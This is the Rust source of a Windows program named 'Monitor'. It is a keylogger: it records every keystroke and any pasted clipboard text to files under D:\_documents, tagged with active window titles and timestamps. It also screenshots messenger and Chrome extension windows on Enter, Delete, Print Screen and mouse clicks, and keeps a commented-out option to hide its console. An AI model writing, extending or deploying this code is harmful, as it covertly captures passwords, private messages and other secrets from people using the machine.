// #![windows_subsystem = "windows"]
use arboard::Clipboard;
use core::mem::MaybeUninit;
use winapi::um::winuser;
use std::fs;
use std::path::PathBuf;
use chrono::{Utc, DateTime};
use std::sync::Mutex;
use once_cell::sync::Lazy;
use active_win_pos_rs::{ActiveWindow, get_active_window};
use std::thread::sleep;
use std::time::{Duration, Instant};
use preferences::{AppInfo, PreferencesMap, Preferences};
use monitor::*;

static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
static CTRL_HOLDED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
static APP_INFO: AppInfo = AppInfo{name: "monitor", author: "Hiroki Moto"};
static PREFES_KEY: &str = "info/docs/monitor";
static DOCUMENTS: &[u8] = b"D:\\_documents/";

fn main() {
    #[derive(Copy, Clone, Eq, PartialEq, Debug)]
    enum Events { ClickTrayIcon, DoubleClickTrayIcon }

    let mut path = PathBuf::from("D:\\");
    path.push("_documents");
    if !path.exists() {
        match fs::create_dir("D:\\_documents") {
            Ok(..) => {
                match fs::create_dir("D:\\_documents/logs") {
                    Ok(..) => (),
                    Err(..) => {
                        print!("failed to create documents/logs folders.");
                    }
                };
                match fs::create_dir("D:\\_documents/screens") {
                    Ok(..) => (),
                    Err(..) => {
                        print!("failed to create documents/screens folders.");
                    }
                };
            },
            Err(..) => {
                print!("failed to create documents folders.");
                std::process::exit(0);
            }
        };
    }

    let interval = Duration::from_secs(1);
    let mut next_time = Instant::now() + interval;
    log_machine_status("end");
    log_machine_status("start");

    let (s, r) = std::sync::mpsc::channel::<Events>();
    let icon = include_bytes!("./resources/appicon_128x128.ico");

    // Needlessly complicated tray icon with all the whistles and bells
    let mut tray_icon = TrayIconBuilder::new()
        .sender(s)
        .icon_from_buffer(icon)
        .tooltip("Monitor")
        .on_click(Events::ClickTrayIcon)
        .on_double_click(Events::DoubleClickTrayIcon)
        .build()
        .unwrap();

    std::thread::spawn(move || {
        if let Err(error) = listen(track) {
            println!("Error: {:?}", error)
        }
    });
    std::thread::spawn(move || {
        r.iter().for_each(|m| match m {
            Events::DoubleClickTrayIcon => {}
            Events::ClickTrayIcon => {}
        })
    });
    std::thread::spawn(move || {
        loop {
            let now = Utc::now();
            let x: String = format!("{}", now);
            let mut faves: PreferencesMap<String> = PreferencesMap::new();
            faves.insert("boot".into(), x.into());
            let save_result = faves.save(&APP_INFO, PREFES_KEY);

            sleep(next_time - Instant::now());
            next_time += interval;
        }
    });

    loop {
        unsafe {
            let mut msg = MaybeUninit::uninit();
            let bret = winuser::GetMessageA(msg.as_mut_ptr(), 0 as _, 0, 0);
            if bret > 0 {
                winuser::TranslateMessage(msg.as_ptr());
                winuser::DispatchMessageA(msg.as_ptr());
            } else {
                break;
            }
        }
    }
}

fn track(event: Event) {
    match event.event_type {
        EventType::KeyPress(Key::Alt | Key::AltGr) => println!("Alt!"),
        EventType::KeyPress(Key::CapsLock) => println!("CapsLock!"),
        EventType::KeyPress(Key::ControlLeft | Key::ControlRight) => {
            *CTRL_HOLDED.lock().unwrap() = true;
        },
        EventType::KeyRelease(Key::ControlLeft | Key::ControlRight) => {
            *CTRL_HOLDED.lock().unwrap() = false;
        }
        EventType::KeyPress(Key::Delete) => {
            match get_active_window() {
                Ok(active_window) => {
                    capture_screen(active_window);
                },
                Err(()) => {
                    println!("error occurred while getting the active window");
                }
            }
        },
        EventType::KeyPress(Key::DownArrow | Key::UpArrow | Key::LeftArrow | Key::RightArrow) => println!("Up/Down/Left/Right!"),
        EventType::KeyPress(Key::Home) => println!("Home!"),
        EventType::KeyPress(Key::Insert) => println!("Insert!"),
        EventType::KeyPress(Key::End) => println!("End!"),
        EventType::KeyPress(Key::Escape) => println!("Escape!"),
        EventType::KeyPress(Key::F1 | Key::F2 | Key::F3 | Key::F4 | Key::F5 | Key::F6 | Key::F7 | Key::F8 | Key::F9 | Key::F10 | Key::F11 | Key::F12) => println!("Fn!"),
        EventType::KeyPress(Key::MetaLeft | Key::MetaRight) => println!("Meta Left/Right!"),
        EventType::KeyPress(Key::ShiftLeft | Key::ShiftRight) => println!("Shift Left/Right!"),
        EventType::KeyPress(Key::PageUp | Key::PageDown) => println!("Page Up/Down!"),
        EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
        EventType::KeyPress(Key::Pause | Key::PrintScreen) => {
            match get_active_window() {
                Ok(active_window) => {
                    capture_screen(active_window);
                },
                Err(()) => {
                    println!("error occurred while getting the active window");
                }
            }
        },
        EventType::KeyPress(Key::Slash) => {
            *LOG_FILE.lock().unwrap() += "/";
            *LOGGED.lock().unwrap() = false;
        },
        EventType::KeyPress(Key::BackSlash) => {
            *LOG_FILE.lock().unwrap() += "\\";
            *LOGGED.lock().unwrap() = false;
        },
        EventType::KeyPress(Key::BackQuote) => {
            *LOG_FILE.lock().unwrap() += "`";
            *LOGGED.lock().unwrap() = false;
        },
        EventType::KeyPress(Key::Return) => {
            let now = Utc::now();
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();

            match get_active_window() {
                Ok(active_window) => {
                    let info: String = format!("==={}|{}\n", active_window.title, now_parsed.to_string());
                    *LOG_FILE.lock().unwrap() += &info;
                    let logs = LOG_FILE.lock().unwrap().clone();

                    match do_logs(logs) {
                        Ok(_) => {
                            *LOGGED.lock().unwrap() = true;
                            println!("Text written to logs.")
                        },
                        Err(e) => println!("Error: {e:?}"),
                    };

                    capture_screen(active_window);
                },
                Err(()) => {
                    println!("error occurred while getting the active window");
                }
            }
        },
        EventType::KeyPress(Key::Unknown(_u32)) => println!("Unknown key!"),
        EventType::KeyPress(key) => {
            let _key = event.name.unwrap();

            if CTRL_HOLDED.lock().unwrap().clone() {
                match key {
                    Key::KeyV => {
                        let mut clipboard = Clipboard::new().unwrap();
                        *LOG_FILE.lock().unwrap() += &clipboard.get_text().unwrap();
                        // let the_string = "Hello, world!";
                        // clipboard.set_text(the_string).unwrap();
                        // println!("But now the clipboard text should be: \"{}\"", the_string);
                    },
                    _ => {}
                }
            } else {
                *LOG_FILE.lock().unwrap() += &_key;
                *LOGGED.lock().unwrap() = false;
            }
        },
        EventType::ButtonPress(button) => match button {
            Button::Left => {
                if !LOGGED.lock().unwrap().clone() {
                    let now = Utc::now();
                    let x: String = format!("{}", now);
                    let now_parsed: DateTime<Utc> = x.parse().unwrap();

                    match get_active_window() {
                        Ok(active_window) => {
                            let info: String = format!("==={}|{}\n", active_window.title, now_parsed.to_string());
                            *LOG_FILE.lock().unwrap() += &info;
                            let logs = LOG_FILE.lock().unwrap().clone();
                            match do_logs(logs) {
                                Ok(_) => {
                                    *LOGGED.lock().unwrap() = true;
                                    println!("Text written to logs.")
                                },
                                Err(e) => println!("Error: {e:?}"),
                            };
                            capture_screen(active_window);
                        },
                        Err(()) => {
                            println!("error occurred while getting the active window");
                        }
                    }
                } else {
                    match get_active_window() {
                        Ok(active_window) => {
                            let now = Utc::now();
                            let x: String = format!("{}", now);
                            let now_parsed: DateTime<Utc> = x.parse().unwrap();
                            let info: String = format!("{}|{}\n", active_window.title, now_parsed.to_string());
                            *LOG_FILE.lock().unwrap() += &info;
                            let logs = LOG_FILE.lock().unwrap().clone();
                            match do_logs(logs) {
                                Ok(_) => {
                                    *LOGGED.lock().unwrap() = true;
                                    println!("Text written to logs.")
                                },
                                Err(e) => println!("Error: {e:?}"),
                            };
                        },
                        Err(()) => {
                            println!("error occurred while getting the active window");
                        }
                    }
                }
            },
            Button::Middle => (),
            Button::Right => {
                match get_active_window() {
                    Ok(active_window) => {
                        capture_screen(active_window);
                    },
                    Err(()) => {
                        println!("error occurred while getting the active window");
                    }
                }
            },
            Button::Unknown(..) => (),
        },
        EventType::MouseMove{..} => (),
        _ => (),
    }
}

fn capture_screen(active_window: ActiveWindow) {
    let is_extensions = active_window.title == "" && active_window.app_name == "Google Chrome";
    if is_messengers(active_window.title) || is_extensions {
        let screens = Screen::all().unwrap();

        for screen in screens {
            // let image = screen.capture().unwrap();
            let image = screen.capture_area(
                active_window.position.x as i32,
                active_window.position.y as i32,
                active_window.position.width as u32,
                active_window.position.height as u32
            ).unwrap();
            let temp = format!("{}temp.png", String::from_utf8_lossy(DOCUMENTS));
            image
                .save(temp)
                .unwrap();

            match append_screenshots() {
                Ok(_) => println!("Screenshots written to logs."),
                Err(e) => println!("Error: {e:?}"),
            };
        }
    }
}

fn log_machine_status(status: &str) {
    let now: DateTime<Utc> = Utc::now();
    let fname = now.format("%Y-%m-%d").to_string();
    *LOG_FILE.lock().unwrap() = read_logs(&fname, "log.txt");

    match status {
        "start" => {
            let now = Utc::now();
            let x: String = format!("{}", now);
            let now_parsed: DateTime<Utc> = x.parse().unwrap();
            let info: String = format!(">>>>>>>>>>>>>>>>>{}>>>>>>>>>>>>>>>>>\n", now_parsed.to_string());
            *LOG_FILE.lock().unwrap() += &info;
        },
        "end" => {
            let load_result = PreferencesMap::<String>::load(&APP_INFO, PREFES_KEY);
            match load_result {
                Ok(prefs) => {
                    println!("{:?}", prefs.get("boot".into()).unwrap());
                    let info: String = format!("<<<<<<<<<<<<<<<<<{}<<<<<<<<<<<<<<<<<\n", prefs.get("boot".into()).unwrap());
                    *LOG_FILE.lock().unwrap() += &info;
                },
                Err(..) => {}
            };
        },
        _ => {}
    }

    let logs = LOG_FILE.lock().unwrap().clone();
    match do_logs(logs) {
        Ok(_) => {
            *LOGGED.lock().unwrap() = true;
            println!("Monitor has recorded machine {} status.", status);
        },
        Err(e) => println!("Error: {e:?}"),
    };
}